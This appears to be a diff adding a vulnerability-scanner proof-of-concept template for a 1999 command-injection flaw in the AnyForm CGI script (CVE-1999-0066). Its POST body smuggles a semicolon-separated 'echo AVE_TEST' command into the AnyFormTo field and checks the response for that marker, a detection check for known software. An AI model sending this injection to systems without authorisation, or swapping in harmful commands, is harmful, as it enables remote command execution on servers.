@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "AnyForm CGI 1.0/2.0 的 AnyFormTo 参数未经消毒直接传入 system() 调用。通过在参数值中插入分号可注入任意系统命令。此 PoC 通过注入 echo 命令输出特征字符串来验证命令执行漏洞是否存在。"
+id = "POC-AVE-1999-0165"
+name = "John S.2 Roberts AnyForm CGI RCE PoC"
+severity = "critical"
+tags = ["ave-1999-0165"]
+vuln_id = [
+    "CVE-1999-0066",
+    "AVE-1999-0165",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/AnyForm"
+protocol = "http"
+
+[poc.requests.body]
+content = "AnyFormTo=test@test.com%3Becho%20AVE_TEST&AnyFormEmail=attacker@test.com"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
